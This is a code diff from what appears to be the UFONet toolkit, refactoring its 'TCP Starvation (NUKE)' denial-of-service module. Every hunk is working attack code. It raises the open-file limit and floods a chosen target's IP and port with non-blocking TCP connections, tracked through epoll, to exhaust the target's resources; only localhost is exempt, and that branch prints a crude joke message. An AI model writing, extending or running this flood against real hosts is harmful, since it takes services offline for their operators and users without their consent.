@@ -16,15 +16,15 @@ except:
     from urllib.parse import urlparse
 
 # UFONet TCP Starvation (NUKE)
-def connect(ip, port, source = None):
+def connect(ip, port, address_dict):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    if source is not None:
-        s.bind((source, 0))
+    if address_dict['source'] is not None:
+        s.bind((address_dict['source'], 0))
     s.setblocking(0)
     s.connect_ex((ip, port))
     return s
 
-def nukeize(ip, port, rounds, source = None):
+def nukeize(ip, port, rounds, address_dict):
     n=0
     try: # RFC793 will lacks an exception if reset is not sent
         resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000)) # modify kernel ulimit to: 100000
@@ -35,8 +35,8 @@ def nukeize(ip, port, rounds, source = None):
         for x in range (0,int(rounds)):
             try:
                 n=n+1
-                s = connect(ip, port, source)
-                print("[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]")
+                s = connect(ip, port, address_dict)
+                # print("[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]")
                 connections[s.fileno()] = s 
                 epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)
             except:
@@ -47,7 +47,7 @@ def nukeize(ip, port, rounds, source = None):
         print("[Error] [AI] [NUKE] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class NUKE(object):
-    def attacking(self, target, rounds, source = None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] TCP Starvation (NUKE) is ready to fire: [" , rounds, "nukes ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -71,4 +71,4 @@ class NUKE(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [NUKE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        nukeize(ip, port, rounds, source) # attack with NUKE using threading
+        nukeize(ip, port, rounds, address_dict) # attack with NUKE using threading
